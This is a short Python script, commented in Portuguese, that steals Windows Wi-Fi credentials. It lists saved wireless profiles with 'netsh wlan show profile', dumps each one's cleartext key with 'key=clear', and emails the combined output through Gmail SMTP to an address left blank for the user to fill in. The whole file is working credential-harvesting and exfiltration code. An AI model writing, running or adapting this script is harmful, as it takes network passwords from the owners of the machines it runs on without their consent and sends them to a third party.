import subprocess
import smtplib
import re

def mandar_email(email,senha,mensagem):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email,senha)
    server.sendmail(email,email,mensagem)
    server.quit()


comando = "netsh wlan show profile"
redes = subprocess.check_output(comando, shell=True)
redes = redes.decode("utf-8", errors="ignore")
network_names = re.findall("(:)(.*)", redes)


resultado = ""
for network_name in network_names:
    print(network_name[1])
    network_name[1].rstrip('\r')
    if network_name[1]:
        comando = "netsh wlan show profile " + network_name[1] + " key=clear"
        resultado_for = subprocess.check_output(comando, shell= True)
        resultado_for = resultado_for.decode("utf-8", errors="ignore")
        resultado += resultado_for


mandar_email("", "", resultado)#Colocar email e senha aqui
